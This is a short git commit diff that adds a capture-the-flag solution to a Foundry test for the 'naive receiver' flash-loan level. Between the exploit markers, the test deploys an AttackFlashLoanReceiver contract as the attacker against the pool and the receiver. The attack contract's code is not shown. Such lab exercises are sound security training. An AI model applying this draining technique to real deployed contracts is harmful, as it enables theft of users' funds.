2a852624f001b6f1afc2bb4c2b629d962dc2c23d
shoyo <shoyo109527@gmail.com>
2023-12-24 19:36:06 +0800

    pass Naive receiver

--- test/Levels/naive-receiver/NaiveReceiver.t.sol
+++ test/Levels/naive-receiver/NaiveReceiver.t.sol
@@ -6,6 +6,7 @@ import "forge-std/Test.sol";
 
 import {FlashLoanReceiver} from "../../../src/Contracts/naive-receiver/FlashLoanReceiver.sol";
 import {NaiveReceiverLenderPool} from "../../../src/Contracts/naive-receiver/NaiveReceiverLenderPool.sol";
+import {AttackFlashLoanReceiver} from "../../../src/Contracts/naive-receiver/AttackFlashLoanReceiver.sol";
 
 contract NaiveReceiver is Test {
     uint256 internal constant ETHER_IN_POOL = 1_000e18;
@@ -33,9 +34,7 @@ contract NaiveReceiver is Test {
         assertEq(address(naiveReceiverLenderPool).balance, ETHER_IN_POOL);
         assertEq(naiveReceiverLenderPool.fixedFee(), 1e18);
 
-        flashLoanReceiver = new FlashLoanReceiver(
-            payable(naiveReceiverLenderPool)
-        );
+        flashLoanReceiver = new FlashLoanReceiver(payable(naiveReceiverLenderPool));
         vm.label(address(flashLoanReceiver), "Flash Loan Receiver");
         vm.deal(address(flashLoanReceiver), ETHER_IN_RECEIVER);
 
@@ -48,7 +47,9 @@ contract NaiveReceiver is Test {
         /**
          * EXPLOIT START *
          */
-
+        vm.startPrank(attacker);
+        new AttackFlashLoanReceiver(address(flashLoanReceiver), payable(naiveReceiverLenderPool));
+        vm.stopPrank();
         /**
          * EXPLOIT END *
          */
